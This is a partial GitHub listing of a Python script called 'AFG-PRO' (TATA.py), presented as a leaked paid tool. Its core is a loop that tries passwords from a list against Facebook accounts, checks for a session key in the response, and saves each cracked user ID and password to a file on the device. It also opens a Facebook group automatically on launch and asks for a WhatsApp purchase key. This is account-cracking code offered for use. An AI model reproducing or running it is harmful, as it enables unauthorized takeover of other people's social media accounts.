...
JUTTBRAND Update TATA.py
 1 contributor
709 lines (706 sloc)  49.6 KB
#LEAKED BY : AWAIS TAHIR 
#Paid
#ENJOY GUYS
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open https://www.facebook.com/groups/5895163873869140/?ref=share_group_link)
...
----------------------------------------------
 Author    : ROOHULLAH
 Github    : AFG-Cloner-2
 Facebook  : Rooh Ul Amin
 Tool Name : AFG-PRO
 Type type : PAID
 Version   : 0.0.1
----------------------------------------------
 AFG Pro version 0.0.1
 For Haters: AFGHANISTAN ZINDABAD🇦🇫❤😍
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923139974897&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi AFG Sir, I Need To Buy Your Paid AFG PRO Tools Version 0.0.1 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/AFG-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [AFG-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/AFG-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [AFG-OK] '+uid+' | '+pas+'\033[1;97m')
